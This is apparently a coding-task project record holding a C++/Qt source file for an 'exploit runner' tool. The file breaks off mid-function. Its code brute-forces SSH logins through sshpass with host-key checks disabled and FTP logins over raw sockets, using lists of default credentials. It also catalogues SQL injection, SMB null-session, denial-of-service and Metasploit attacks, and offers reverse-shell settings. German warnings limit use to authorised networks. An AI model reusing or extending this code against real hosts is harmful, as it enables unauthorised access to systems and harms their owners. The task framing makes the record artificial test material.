{
  "id": "project-ipsceener-mcbxu5zi",
  "title": "IPSceener",
  "description": "deine Mutter",
  "difficulty": "hard",
  "language": "cpp",
  "tags": [],
  "projectStructure": [
    {
      "name": "IpScanner",
      "type": "folder",
      "children": [
        {
          "name": "exploitsystem.cpp",
          "type": "file",
          "content": "#include <QtWidgets/QMessageBox>\r\n#include <QtWidgets/QInputDialog>\r\n#include <QtCore/QStandardPaths>\r\n#include <QtCore/QDir>\r\n#include <QtCore/QJsonDocument>\r\n#include <QtCore/QJsonObject>\r\n#include <QtCore/QJsonArray>\r\n#include \"exploitsystem.h\"\r\n\r\nExploitDatabase* ExploitDatabase::s_instance = nullptr;\r\n\r\nExploitDatabase* ExploitDatabase::instance()\r\n{\r\n    if (!s_instance) {\r\n        s_instance = new ExploitDatabase();\r\n    }\r\n    return s_instance;\r\n}\r\n\r\nExploitDatabase::ExploitDatabase()\r\n{\r\n    initializeBuiltinExploits();\r\n    loadExploitsFromFile();\r\n}\r\n\r\nvoid ExploitDatabase::initializeBuiltinExploits()\r\n{\r\n    m_exploits.append(BuiltinExploits::createSSHBruteForce());\r\n    m_exploits.append(BuiltinExploits::createFTPBruteForce());\r\n    m_exploits.append(BuiltinExploits::createHTTPBruteForce());\r\n    m_exploits.append(BuiltinExploits::createSQLInjection());\r\n    m_exploits.append(BuiltinExploits::createSMBNullSession());\r\n    m_exploits.append(BuiltinExploits::createTelnetBruteForce());\r\n    m_exploits.append(BuiltinExploits::createSNMPBruteForce());\r\n}\r\n\r\nQList<ExploitInfo> ExploitDatabase::getExploitsForVulnerability(const VulnerabilityInfo &vuln)\r\n{\r\n    QList<ExploitInfo> matchingExploits;\r\n\r\n    for (const ExploitInfo &exploit : m_exploits) {\r\n        if (exploit.targetService.toLower() == vuln.service.toLower() ||\r\n            exploit.targetPort == vuln.port) {\r\n            matchingExploits.append(exploit);\r\n        }\r\n    }\r\n\r\n    return matchingExploits;\r\n}\r\n\r\nQList<ExploitInfo> ExploitDatabase::getExploitsForService(const QString &service, int port)\r\n{\r\n    QList<ExploitInfo> matchingExploits;\r\n\r\n    for (const ExploitInfo &exploit : m_exploits) {\r\n        if (exploit.targetService.toLower() == service.toLower() ||\r\n            exploit.targetPort == port) {\r\n            matchingExploits.append(exploit);\r\n        }\r\n    }\r\n\r\n    return matchingExploits;\r\n}\r\n\r\nExploitWorker::ExploitWorker(const VulnerabilityInfo &vulnerability, const ExploitInfo &exploit, const QString &targetIp)\r\n    : m_vulnerability(vulnerability), m_exploit(exploit), m_targetIp(targetIp)\r\n{\r\n    m_socket = nullptr;\r\n    m_process = nullptr;\r\n    setAutoDelete(true);\r\n}\r\n\r\nvoid ExploitWorker::run()\r\n{\r\n    emit exploitStarted(m_exploit.id, m_targetIp);\r\n\r\n    m_result.exploitId = m_exploit.id;\r\n    m_result.targetIp = m_targetIp;\r\n    m_result.targetPort = m_exploit.targetPort;\r\n    m_result.executionTime = QDateTime::currentDateTime();\r\n    m_result.successful = false;\r\n\r\n    try {\r\n        switch (m_exploit.type) {\r\n        case ExploitType::CREDENTIAL_ATTACK:\r\n            executeCredentialAttack();\r\n            break;\r\n        case ExploitType::BUFFER_OVERFLOW:\r\n            executeBufferOverflow();\r\n            break;\r\n        case ExploitType::SQL_INJECTION:\r\n            executeSQLInjection();\r\n            break;\r\n        case ExploitType::COMMAND_INJECTION:\r\n            executeCommandInjection();\r\n            break;\r\n        case ExploitType::METASPLOIT_MODULE:\r\n            executeMetasploitModule();\r\n            break;\r\n        case ExploitType::CUSTOM_SCRIPT:\r\n            executeCustomScript();\r\n            break;\r\n        case ExploitType::DENIAL_OF_SERVICE:\r\n            executeDenialOfService();\r\n            break;\r\n        default:\r\n            m_result.errorMessage = \"Exploit type not implemented\";\r\n            emit exploitFailed(m_exploit.id, m_result.errorMessage);\r\n            return;\r\n        }\r\n\r\n        emit exploitCompleted(m_exploit.id, m_result);\r\n\r\n    } catch (const std::exception &e) {\r\n        m_result.errorMessage = QString(\"Exception: %1\").arg(e.what());\r\n        emit exploitFailed(m_exploit.id, m_result.errorMessage);\r\n    }\r\n\r\n    if (m_socket) {\r\n        m_socket->deleteLater();\r\n    }\r\n    if (m_process) {\r\n        m_process->kill();\r\n        m_process->deleteLater();\r\n    }\r\n}\r\n\r\nvoid ExploitWorker::executeCredentialAttack()\r\n{\r\n    emit exploitProgress(m_exploit.id, 10, \"Starting credential attack...\");\r\n\r\n    // Common credentials for different services\r\n    QStringList commonUsers = {\"admin\", \"administrator\", \"root\", \"user\", \"guest\", \"test\", \"demo\"};\r\n    QStringList commonPasswords = {\"\", \"admin\", \"password\", \"123456\", \"admin123\", \"root\", \"guest\", \"test\"};\r\n\r\n    if (m_exploit.targetService.toLower() == \"ssh\") {\r\n        commonUsers << \"ubuntu\" << \"pi\" << \"vagrant\";\r\n        commonPasswords << \"ubuntu\" << \"raspberry\" << \"vagrant\";\r\n    } else if (m_exploit.targetService.toLower() == \"ftp\") {\r\n        commonUsers << \"anonymous\" << \"ftp\";\r\n        commonPasswords << \"\" << \"ftp\" << \"anonymous\";\r\n    }\r\n\r\n    int totalAttempts = commonUsers.size() * commonPasswords.size();\r\n    int currentAttempt = 0;\r\n\r\n    for (const QString &username : commonUsers) {\r\n        for (const QString &password : commonPasswords) {\r\n            currentAttempt++;\r\n            int progress = 10 + (currentAttempt * 80) / totalAttempts;\r\n\r\n            emit exploitProgress(m_exploit.id, progress,\r\n                                 QString(\"Trying %1:%2\").arg(username, password.isEmpty() ? \"<empty>\" : password));\r\n\r\n            if (testCredentials(username, password)) {\r\n                m_result.successful = true;\r\n                m_result.gainedAccess = QString(\"Valid credentials: %1:%2\").arg(username, password);\r\n                m_result.output += QString(\"SUCCESS: %1:%2\\n\").arg(username, password);\r\n                extractSystemInfo();\r\n                return;\r\n            }\r\n\r\n            QThread::msleep(100); // Prevent flooding\r\n        }\r\n    }\r\n\r\n    m_result.output += \"No valid credentials found with common combinations\";\r\n}\r\n\r\nbool ExploitWorker::testCredentials(const QString &username, const QString &password)\r\n{\r\n    if (m_exploit.targetService.toLower() == \"ssh\") {\r\n        return testSSHCredentials(username, password);\r\n    } else if (m_exploit.targetService.toLower() == \"ftp\") {\r\n        return testFTPCredentials(username, password);\r\n    } else if (m_exploit.targetService.toLower() == \"telnet\") {\r\n        return testTelnetCredentials(username, password);\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nbool ExploitWorker::testSSHCredentials(const QString &username, const QString &password)\r\n{\r\n    // In a real implementation, you would use libssh or similar\r\n    // For this example, we'll simulate the test\r\n    QProcess sshProcess;\r\n\r\n    QString command = QString(\"sshpass -p '%1' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no %2@%3 'echo SUCCESS'\")\r\n                          .arg(password, username, m_targetIp);\r\n\r\n    sshProcess.start(\"bash\", QStringList() << \"-c\" << command);\r\n    sshProcess.waitForFinished(10000);\r\n\r\n    QString output = sshProcess.readAllStandardOutput();\r\n    return output.contains(\"SUCCESS\");\r\n}\r\n\r\nbool ExploitWorker::testFTPCredentials(const QString &username, const QString &password)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(m_targetIp, m_exploit.targetPort);\r\n\r\n    if (!socket.waitForConnected(5000)) {\r\n        return false;\r\n    }\r\n\r\n    // Read welcome message\r\n    socket.waitForReadyRead(2000);\r\n    socket.readAll();\r\n\r\n    // Send username\r\n    socket.write(QString(\"USER %1\\r\\n\").arg(username).toUtf8());\r\n    socket.waitForReadyRead(2000);\r\n    QString response = socket.readAll();\r\n\r\n    if (response.startsWith(\"331\")) {\r\n        // Send password\r\n        socket.write(QString(\"PASS %1\\r\\n\").arg(password).toUtf8());\r\n        socket.waitForReadyRead(2000);\r\n        response = socket.readAll();\r\n\r\n        if (response.startsWith(\"230\")) {\r\n            socket.write(\"QUIT\\r\\n\");\r\n            return true;\r\n        }\r\n    }\r\n\r\n    socket.close();\r\n    return false;\r\n}\r\n\r\nExploitDialog::ExploitDialog(const VulnerabilityInfo &vulnerability, QWidget *parent)\r\n    : QDialog(parent), m_vulnerability(vulnerability), m_currentWorker(nullptr), m_exploitRunning(false)\r\n{\r\n    setWindowTitle(QString(\"🔥 Exploit Runner - %1\").arg(vulnerability.title));\r\n    resize(800, 600);\r\n    setModal(true);\r\n\r\n    showWarningDialog();\r\n    setupUI();\r\n    loadAvailableExploits();\r\n}\r\n\r\nvoid ExploitDialog::showWarningDialog()\r\n{\r\n    QMessageBox::StandardButton reply = QMessageBox::warning(this,\r\n                                                             \"⚠️ WARNUNG - Exploit Execution\",\r\n                                                             \"WICHTIGER SICHERHEITSHINWEIS:\\n\\n\"\r\n                                                             \"• Diese Funktion führt echte Angriffe auf Zielsysteme aus\\n\"\r\n                                                             \"• Verwenden Sie dies nur in Ihrem eigenen Netzwerk\\n\"\r\n                                                             \"• Stellen Sie sicher, dass Sie die Berechtigung haben\\n\"\r\n                                                             \"• Exploits können Systeme beschädigen oder destabilisieren\\n\"\r\n                                                             \"• Dokumentieren Sie alle Tests für Compliance\\n\\n\"\r\n                                                             \"Möchten Sie fortfahren?\",\r\n                                                             QMessageBox::Yes | QMessageBox::No | QMessageBox::Cancel);\r\n\r\n    if (reply != QMessageBox::Yes) {\r\n        reject();\r\n        return;\r\n    }\r\n}\r\n\r\nvoid ExploitDialog::setupUI()\r\n{\r\n    QVBoxLayout *mainLayout = new QVBoxLayout(this);\r\n\r\n    // Target info header\r\n    QGroupBox *targetGroup = new QGroupBox(\"🎯 Target Information\");\r\n    QGridLayout *targetLayout = new QGridLayout(targetGroup);\r\n\r\n    targetLayout->addWidget(new QLabel(\"Vulnerability:\"), 0, 0);\r\n    targetLayout->addWidget(new QLabel(m_vulnerability.title), 0, 1);\r\n    targetLayout->addWidget(new QLabel(\"Service:\"), 1, 0);\r\n    targetLayout->addWidget(new QLabel(QString(\"%1:%2\").arg(m_vulnerability.service).arg(m_vulnerability.port)), 1, 1);\r\n    targetLayout->addWidget(new QLabel(\"Severity:\"), 2, 0);\r\n\r\n    QString severityText;\r\n    switch (m_vulnerability.severity) {\r\n    case VulnSeverity::CRITICAL: severityText = \"🔴 CRITICAL\"; break;\r\n    case VulnSeverity::HIGH: severityText = \"🟠 HIGH\"; break;\r\n    case VulnSeverity::MEDIUM: severityText = \"🟡 MEDIUM\"; break;\r\n    case VulnSeverity::LOW: severityText = \"🟢 LOW\"; break;\r\n    case VulnSeverity::INFO: severityText = \"ℹ️ INFO\"; break;\r\n    }\r\n    targetLayout->addWidget(new QLabel(severityText), 2, 1);\r\n\r\n    mainLayout->addWidget(targetGroup);\r\n\r\n    // Tab widget for different sections\r\n    m_tabWidget = new QTabWidget();\r\n\r\n    // Exploit Selection Tab\r\n    QWidget *exploitTab = new QWidget();\r\n    QHBoxLayout *exploitLayout = new QHBoxLayout(exploitTab);\r\n\r\n    // Left side: exploit list\r\n    QVBoxLayout *leftLayout = new QVBoxLayout();\r\n    leftLayout->addWidget(new QLabel(\"🔥 Available Exploits:\"));\r\n\r\n    m_exploitTable = new QTableWidget();\r\n    m_exploitTable->setColumnCount(5);\r\n    m_exploitTable->setHorizontalHeaderLabels({\"Name\", \"Type\", \"Difficulty\", \"Success Rate\", \"Requirements\"});\r\n    m_exploitTable->horizontalHeader()->setStretchLastSection(true);\r\n    m_exploitTable->setSelectionBehavior(QAbstractItemView::SelectRows);\r\n    leftLayout->addWidget(m_exploitTable);\r\n\r\n    // Control buttons\r\n    QHBoxLayout *controlLayout = new QHBoxLayout();\r\n    m_runExploitButton = new QPushButton(\"🚀 Run Exploit\");\r\n    m_runExploitButton->setStyleSheet(\"QPushButton { background-color: #dc3545; color: white; font-weight: bold; }\");\r\n    m_stopExploitButton = new QPushButton(\"⏹️ Stop\");\r\n    m_stopExploitButton->setEnabled(false);\r\n\r\n    controlLayout->addWidget(m_runExploitButton);\r\n    controlLayout->addWidget(m_stopExploitButton);\r\n    controlLayout->addStretch();\r\n\r\n    leftLayout->addLayout(controlLayout);\r\n\r\n    // Progress and status\r\n    m_statusLabel = new QLabel(\"Ready to execute exploit\");\r\n    m_progressBar = new QProgressBar();\r\n    leftLayout->addWidget(m_statusLabel);\r\n    leftLayout->addWidget(m_progressBar);\r\n\r\n    exploitLayout->addLayout(leftLayout, 2);\r\n\r\n    // Right side: exploit details\r\n    QVBoxLayout *rightLayout = new QVBoxLayout();\r\n    rightLayout->addWidget(new QLabel(\"📋 Exploit Details:\"));\r\n\r\n    m_exploitDetails = new QTextEdit();\r\n    m_exploitDetails->setReadOnly(true);\r\n    m_exploitDetails->setMaximumWidth(300);\r\n    rightLayout->addWidget(m_exploitDetails);\r\n\r\n    exploitLayout->addLayout(rightLayout, 1);\r\n\r\n    m_tabWidget->addTab(exploitTab, \"🔥 Exploits\");\r\n\r\n    // Configuration Tab\r\n    QWidget *configTab = new QWidget();\r\n    QVBoxLayout *configLayout = new QVBoxLayout(configTab);\r\n\r\n    QGroupBox *payloadGroup = new QGroupBox(\"⚙️ Payload Configuration\");\r\n    QFormLayout *payloadLayout = new QFormLayout(payloadGroup);\r\n\r\n    m_payloadEdit = new QLineEdit();\r\n    m_timeoutSpinBox = new QSpinBox();\r\n    m_timeoutSpinBox->setRange(5, 300);\r\n    m_timeoutSpinBox->setValue(30);\r\n    m_timeoutSpinBox->setSuffix(\" sec\");\r\n\r\n    payloadLayout->addRow(\"Custom Payload:\", m_payloadEdit);\r\n    payloadLayout->addRow(\"Timeout:\", m_timeoutSpinBox);\r\n\r\n    QGroupBox *shellGroup = new QGroupBox(\"🐚 Reverse Shell Options\");\r\n    QFormLayout *shellLayout = new QFormLayout(shellGroup);\r\n\r\n    m_reverseShellCheckBox = new QCheckBox(\"Enable Reverse Shell\");\r\n    m_listenerPortEdit = new QLineEdit(\"4444\");\r\n    m_shellTypeCombo = new QComboBox();\r\n    m_shellTypeCombo->addItems({\"bash\", \"sh\", \"cmd\", \"powershell\", \"python\", \"perl\"});\r\n    m_verboseOutputCheckBox = new QCheckBox(\"Verbose Output\");\r\n    m_verboseOutputCheckBox->setChecked(true);\r\n\r\n    shellLayout->addRow(m_reverseShellCheckBox);\r\n    shellLayout->addRow(\"Listener Port:\", m_listenerPortEdit);\r\n    shellLayout->addRow(\"Shell Type:\", m_shellTypeCombo);\r\n    shellLayout->addRow(m_verboseOutputCheckBox);\r\n\r\n    configLayout->addWidget(payloadGroup);\r\n    configLayout->addWidget(shellGroup);\r\n    configLayout->addStretch();\r\n\r\n    m_tabWidget->addTab(configTab, \"⚙️ Config\");\r\n\r\n    // Results Tab\r\n    QWidget *resultsTab = new QWidget();\r\n    QVBoxLayout *resultsLayout = new QVBoxLayout(resultsTab);\r\n\r\n    QLabel *outputLabel = new QLabel(\"📤 Exploit Output:\");\r\n    m_outputEdit = new QTextEdit();\r\n    m_outputEdit->setFont(QFont(\"Consolas\", 10));\r\n\r\n    QLabel *errorLabel = new QLabel(\"❌ Errors:\");\r\n    m_errorEdit = new QTextEdit();\r\n    m_errorEdit->setMaximumHeight(100);\r\n    m_errorEdit->setStyleSheet(\"QTextEdit { background-color: #2d1b1b; color: #ff6b6b; }\");\r\n\r\n    QLabel *sessionLabel = new QLabel(\"🔗 Active Sessions:\");\r\n    m_sessionTable = new QTableWidget();\r\n    m_sessionTable->setColumnCount(4);\r\n    m_sessionTable->setHorizontalHeaderLabels({\"Session ID\", \"Type\", \"Target\", \"Status\"});\r\n    m_sessionTable->setMaximumHeight(120);\r\n\r\n    QHBoxLayout *resultButtonLayout = new QHBoxLayout();\r\n    m_saveResultsButton = new QPushButton(\"💾 Save Results\");\r\n    m_openShellButton = new QPushButton(\"🐚 Open Shell\");\r\n    m_openShellButton->setEnabled(false);\r\n\r\n    resultButtonLayout->addWidget(m_saveResultsButton);\r\n    resultButtonLayout->addWidget(m_openShellButton);\r\n    resultButtonLayout->addStretch();\r\n\r\n    resultsLayout->addWidget(outputLabel);\r\n    resultsLayout->addWidget(m_outputEdit, 2);\r\n    resultsLayout->addWidget(errorLabel);\r\n    resultsLayout->addWidget(m_errorEdit);\r\n    resultsLayout->addWidget(sessionLabel);\r\n    resultsLayout->addWidget(m_sessionTable);\r\n    resultsLayout->addLayout(resultButtonLayout);\r\n\r\n    m_tabWidget->addTab(resultsTab, \"📊 Results\");\r\n\r\n    mainLayout->addWidget(m_tabWidget);\r\n\r\n    // Bottom buttons\r\n    QHBoxLayout *bottomLayout = new QHBoxLayout();\r\n    QPushButton *closeButton = new QPushButton(\"❌ Close\");\r\n    QPushButton *helpButton = new QPushButton(\"❓ Help\");\r\n\r\n    bottomLayout->addWidget(helpButton);\r\n    bottomLayout->addStretch();\r\n    bottomLayout->addWidget(closeButton);\r\n\r\n    mainLayout->addLayout(bottomLayout);\r\n\r\n    // Connect signals\r\n    connect(m_exploitTable, &QTableWidget::itemSelectionChanged, this, &ExploitDialog::onExploitSelected);\r\n    connect(m_runExploitButton, &QPushButton::clicked, this, &ExploitDialog::runSelectedExploit);\r\n    connect(m_stopExploitButton, &QPushButton::clicked, this, &ExploitDialog::stopExploit);\r\n    connect(m_saveResultsButton, &QPushButton::clicked, this, &ExploitDialog::saveExploitResults);\r\n    connect(m_openShellButton, &QPushButton::clicked, this, &ExploitDialog::openReverseShell);\r\n    connect(closeButton, &QPushButton::clicked, this, &QDialog::accept);\r\n\r\n    connect(helpButton, &QPushButton::clicked, [this]() {\r\n        QMessageBox::information(this, \"❓ Exploit Runner Help\",\r\n                                 \"🔥 EXPLOIT RUNNER HILFE\\n\\n\"\r\n                                 \"📋 Exploit Auswahl:\\n\"\r\n                                 \"• Wählen Sie einen passenden Exploit aus der Liste\\n\"\r\n                                 \"• Überprüfen Sie die Anforderungen und Erfolgsrate\\n\"\r\n                                 \"• Konfigurieren Sie ggf. custom Payloads\\n\\n\"\r\n                                 \"⚙️ Konfiguration:\\n\"\r\n                                 \"• Passen Sie Timeouts an das Zielsystem an\\n\"\r\n                                 \"• Aktivieren Sie Reverse Shell für interaktive Zugriffe\\n\"\r\n                                 \"• Verbose Output für detaillierte Logs\\n\\n\"\r\n                                 \"🚀 Ausführung:\\n\"\r\n                                 \"• Klicken Sie 'Run Exploit' zum Starten\\n\"\r\n                                 \"• Überwachen Sie den Fortschritt im Status\\n\"\r\n                                 \"• Ergebnisse werden im Results Tab angezeigt\\n\\n\"\r\n                                 \"⚠️ WICHTIG:\\n\"\r\n                                 \"• Nur in autorisierten Netzwerken verwenden\\n\"\r\n                                 \"• Dokumentieren Sie alle Tests\\n\"\r\n                                 \"• Stoppen Sie Exploits bei Problemen sofort\");\r\n    });\r\n}\r\n\r\nvoid ExploitDialog::loadAvailableExploits()\r\n{\r\n    m_availableExploits = ExploitDatabase::instance()->getExploitsForVulnerability(m_vulnerability);\r\n\r\n    // Add Metasploit modules if available\r\n    QStringList metasploitModules = getMetasploitModules(m_vulnerability.service, m_vulnerability.port);\r\n    for (const QString &module : metasploitModules) {\r\n        ExploitInfo metasploitExploit;\r\n        metasploitExploit.id = QString(\"msf_%1\").arg(module);\r\n        metasploitExploit.name = QString(\"Metasploit: %1\").arg(module);\r\n        metasploitExploit.description = QString(\"Metasploit module for %1\").arg(m_vulnerability.service);\r\n        metasploitExploit.type = ExploitType::METASPLOIT_MODULE;\r\n        metasploitExploit.targetService = m_vulnerability.service;\r\n        metasploitExploit.targetPort = m_vulnerability.port;\r\n        metasploitExploit.metasploitModule = module;\r\n        metasploitExploit.requirements = \"Metasploit Framework\";\r\n        metasploitExploit.successRate = 0.6;\r\n        metasploitExploit.difficulty = \"medium\";\r\n        m_availableExploits.append(metasploitExploit);\r\n    }\r\n\r\n    // Populate table\r\n    setupExploitList();\r\n}\r\n\r\nvoid ExploitDialog::setupExploitList()\r\n{\r\n    m_exploitTable->setRowCount(m_availableExploits.size());\r\n\r\n    for (int i = 0; i < m_availableExploits.size(); ++i) {\r\n        const ExploitInfo &exploit = m_availableExploits[i];\r\n\r\n        m_exploitTable->setItem(i, 0, new QTableWidgetItem(exploit.name));\r\n\r\n        QString typeStr;\r\n        switch (exploit.type) {\r\n        case ExploitType::CREDENTIAL_ATTACK: typeStr = \"🔑 Credentials\"; break;\r\n        case ExploitType::BUFFER_OVERFLOW: typeStr = \"💥 Buffer Overflow\"; break;\r\n        case ExploitType::SQL_INJECTION: typeStr = \"🗃️ SQL Injection\"; break;\r\n        case ExploitType::XSS_ATTACK: typeStr = \"🌐 XSS\"; break;\r\n        case ExploitType::COMMAND_INJECTION: typeStr = \"⚡ Command Injection\"; break;\r\n        case ExploitType::PRIVILEGE_ESCALATION: typeStr = \"⬆️ Privilege Escalation\"; break;\r\n        case ExploitType::DENIAL_OF_SERVICE: typeStr = \"💥 DoS\"; break;\r\n        case ExploitType::METASPLOIT_MODULE: typeStr = \"🚀 Metasploit\"; break;\r\n        case ExploitType::CUSTOM_SCRIPT: typeStr = \"📜 Custom\"; break;\r\n        }\r\n        m_exploitTable->setItem(i, 1, new QTableWidgetItem(typeStr));\r\n\r\n        // Difficulty with color coding\r\n        QTableWidgetItem *difficultyItem = new QTableWidgetItem(exploit.difficulty.toUpper());\r\n        if (exploit.difficulty == \"easy\") {\r\n            difficultyItem->setBackground(QColor(40, 167, 69, 100));\r\n        } else if (exploit.difficulty == \"medium\") {\r\n            difficultyItem->setBackground(QColor(255, 193, 7, 100));\r\n        } else if (exploit.difficulty == \"hard\") {\r\n            difficultyItem->setBackground(QColor(220, 53, 69, 100));\r\n        } else {\r\n            difficultyItem->setBackground(QColor(108, 117, 125, 100));\r\n        }\r\n        m_exploitTable->setItem(i, 2, difficultyItem);\r\n\r\n        // Success rate\r\n        QTableWidgetItem *successItem = new QTableWidgetItem(QString(\"%1%\").arg(exploit.successRate * 100, 0, 'f', 0));\r\n        if (exploit.successRate >= 0.7) {\r\n            successItem->setBackground(QColor(40, 167, 69, 100));\r\n        } else if (exploit.successRate >= 0.4) {\r\n            successItem->setBackground(QColor(255, 193, 7, 100));\r\n        } else {\r\n            successItem->setBackground(QColor(220, 53, 69, 100));\r\n        }\r\n        m_exploitTable->setItem(i, 3, successItem);\r\n\r\n        m_exploitTable->setItem(i, 4, new QTableWidgetItem(exploit.requirements));\r\n    }\r\n\r\n    m_exploitTable->resizeColumnsToContents();\r\n}\r\n\r\nvoid ExploitDialog::onExploitSelected()\r\n{\r\n    int currentRow = m_exploitTable->currentRow();\r\n    if (currentRow < 0 || currentRow >= m_availableExploits.size()) {\r\n        return;\r\n    }\r\n\r\n    m_selectedExploit = m_availableExploits[currentRow];\r\n    updateExploitDetails();\r\n\r\n    // Enable run button\r\n    m_runExploitButton->setEnabled(!m_exploitRunning);\r\n\r\n    // Update payload field with default payload\r\n    m_payloadEdit->setText(m_selectedExploit.payload);\r\n}\r\n\r\nvoid ExploitDialog::updateExploitDetails()\r\n{\r\n    QString details = QString(R\"(\r\n<h3>🔥 %1</h3>\r\n\r\n<h4>📋 Description:</h4>\r\n<p>%2</p>\r\n\r\n<h4>🎯 Target Information:</h4>\r\n<table border=\"0\" cellpadding=\"3\">\r\n<tr><td><b>Service:</b></td><td>%3</td></tr>\r\n<tr><td><b>Port:</b></td><td>%4</td></tr>\r\n<tr><td><b>Type:</b></td><td>%5</td></tr>\r\n<tr><td><b>Difficulty:</b></td><td>%6</td></tr>\r\n</table>\r\n\r\n<h4>📊 Statistics:</h4>\r\n<table border=\"0\" cellpadding=\"3\">\r\n<tr><td><b>Success Rate:</b></td><td>%7%</td></tr>\r\n<tr><td><b>Requires Auth:</b></td><td>%8</td></tr>\r\n<tr><td><b>Author:</b></td><td>%9</td></tr>\r\n</table>\r\n\r\n<h4>⚙️ Requirements:</h4>\r\n<p>%10</p>\r\n\r\n<h4>🚀 Payload:</h4>\r\n<pre style=\"background: #1a1a1a; padding: 10px; border-radius: 5px;\">%11</pre>\r\n\r\n%12\r\n    )\").arg(m_selectedExploit.name)\r\n                          .arg(m_selectedExploit.description)\r\n                          .arg(m_selectedExploit.targetService)\r\n                          .arg(m_selectedExploit.targetPort)\r\n                          .arg([](ExploitType type) {\r\n                              switch (type) {\r\n                              case ExploitType::CREDENTIAL_ATTACK: return \"Credential Attack\";\r\n                              case ExploitType::BUFFER_OVERFLOW: return \"Buffer Overflow\";\r\n                              case ExploitType::SQL_INJECTION: return \"SQL Injection\";\r\n                              case ExploitType::XSS_ATTACK: return \"XSS Attack\";\r\n                              case ExploitType::COMMAND_INJECTION: return \"Command Injection\";\r\n                              case ExploitType::PRIVILEGE_ESCALATION: return \"Privilege Escalation\";\r\n                              case ExploitType::DENIAL_OF_SERVICE: return \"Denial of Service\";\r\n                              case ExploitType::METASPLOIT_MODULE: return \"Metasploit Module\";\r\n                              case ExploitType::CUSTOM_SCRIPT: return \"Custom Script\";\r\n                              }\r\n                              return \"Unknown\";\r\n                          }(m_selectedExploit.type))\r\n                          .arg(m_selectedExploit.difficulty.toUpper())\r\n                          .arg(m_selectedExploit.successRate * 100, 0, 'f', 0)\r\n                          .arg(m_selectedExploit.requiresAuth ? \"Yes\" : \"No\")\r\n                          .arg(m_selectedExploit.author)\r\n                          .arg(m_selectedExploit.requirements)\r\n                          .arg(m_selectedExploit.payload)\r\n                          .arg(!m_selectedExploit.cveId.isEmpty() ?\r\n                                   QString(\"<h4>🔗 CVE Reference:</h4><p>%1</p>\").arg(m_selectedExploit.cveId) : \"\");\r\n\r\n    m_exploitDetails->setHtml(details);\r\n}\r\n\r\nvoid ExploitDialog::runSelectedExploit()\r\n{\r\n    if (m_selectedExploit.id.isEmpty()) {\r\n        QMessageBox::warning(this, \"⚠️ Warning\", \"Please select an exploit first!\");\r\n        return;\r\n    }\r\n\r\n    // Final confirmation\r\n    QMessageBox::StandardButton reply = QMessageBox::question(this,\r\n                                                              \"🚀 Confirm Exploit Execution\",\r\n                                                              QString(\"Are you sure you want to run this exploit?\\n\\n\"\r\n                                                                      \"Target: %1:%2\\n\"\r\n                                                                      \"Exploit: %3\\n\"\r\n                                                                      \"Type: %4\\n\\n\"\r\n                                                                      \"This action will attempt to exploit the target system!\")\r\n                                                                  .arg(m_vulnerability.service)\r\n                                                                  .arg(m_vulnerability.port)\r\n                                                                  .arg(m_selectedExploit.name)\r\n                                                                  .arg(m_selectedExploit.targetService),\r\n                                                              QMessageBox::Yes | QMessageBox::No);\r\n\r\n    if (reply != QMessageBox::Yes) {\r\n        return;\r\n    }\r\n\r\n    // Clear previous results\r\n    m_outputEdit->clear();\r\n    m_errorEdit->clear();\r\n    m_sessionTable->setRowCount(0);\r\n\r\n    // Update UI state\r\n    m_exploitRunning = true;\r\n    m_runExploitButton->setEnabled(false);\r\n    m_stopExploitButton->setEnabled(true);\r\n    m_progressBar->setValue(0);\r\n    m_statusLabel->setText(\"🚀 Starting exploit...\");\r\n\r\n    // Switch to results tab\r\n    m_tabWidget->setCurrentIndex(2);\r\n\r\n    // Get target IP from vulnerability (assuming it's stored there)\r\n    QString targetIp = \"192.168.1.100\"; // This should come from the vulnerability or be configurable\r\n\r\n    // Create and start exploit worker\r\n    m_currentWorker = new ExploitWorker(m_vulnerability, m_selectedExploit, targetIp);\r\n\r\n    connect(m_currentWorker, &ExploitWorker::exploitStarted,\r\n            this, &ExploitDialog::onExploitStarted);\r\n    connect(m_currentWorker, &ExploitWorker::exploitProgress,\r\n            this, &ExploitDialog::onExploitProgress);\r\n    connect(m_currentWorker, &ExploitWorker::exploitCompleted,\r\n            this, &ExploitDialog::onExploitCompleted);\r\n    connect(m_currentWorker, &ExploitWorker::exploitFailed,\r\n            this, &ExploitDialog::onExploitFailed);\r\n    connect(m_currentWorker, &ExploitWorker::shellObtained,\r\n            this, &ExploitDialog::onShellObtained);\r\n\r\n    QThreadPool::globalInstance()->start(m_currentWorker);\r\n}\r\n\r\nvoid ExploitDialog::stopExploit()\r\n{\r\n    if (m_currentWorker) {\r\n        // In a real implementation, you would signal the worker to stop\r\n        m_statusLabel->setText(\"⏹️ Stopping exploit...\");\r\n        m_exploitRunning = false;\r\n        m_runExploitButton->setEnabled(true);\r\n        m_stopExploitButton->setEnabled(false);\r\n\r\n        m_outputEdit->append(\"\\n🛑 EXPLOIT STOPPED BY USER\\n\");\r\n    }\r\n}\r\n\r\nvoid ExploitDialog::onExploitStarted(const QString &exploitId, const QString &target)\r\n{\r\n    m_statusLabel->setText(QString(\"🚀 Running exploit %1 on %2\").arg(exploitId, target));\r\n    m_outputEdit->append(QString(\"=== EXPLOIT EXECUTION STARTED ===\\n\"));\r\n    m_outputEdit->append(QString(\"Exploit ID: %1\\n\").arg(exploitId));\r\n    m_outputEdit->append(QString(\"Target: %1\\n\").arg(target));\r\n    m_outputEdit->append(QString(\"Start Time: %1\\n\").arg(QDateTime::currentDateTime().toString()));\r\n    m_outputEdit->append(QString(\"===================================\\n\\n\"));\r\n}\r\n\r\nvoid ExploitDialog::onExploitProgress(const QString &exploitId, int percentage, const QString &status)\r\n{\r\n    Q_UNUSED(exploitId)\r\n    m_progressBar->setValue(percentage);\r\n    m_statusLabel->setText(status);\r\n    m_outputEdit->append(QString(\"[%1%] %2\\n\").arg(percentage).arg(status));\r\n    m_outputEdit->ensureCursorVisible();\r\n}\r\n\r\nvoid ExploitDialog::onExploitCompleted(const QString &exploitId, const ExploitResult &result)\r\n{\r\n    Q_UNUSED(exploitId)\r\n\r\n    m_exploitRunning = false;\r\n    m_runExploitButton->setEnabled(true);\r\n    m_stopExploitButton->setEnabled(false);\r\n    m_progressBar->setValue(100);\r\n\r\n    m_exploitResults.append(result);\r\n\r\n    if (result.successful) {\r\n        m_statusLabel->setText(\"✅ Exploit completed successfully!\");\r\n        m_statusLabel->setStyleSheet(\"color: #28a745; font-weight: bold;\");\r\n\r\n        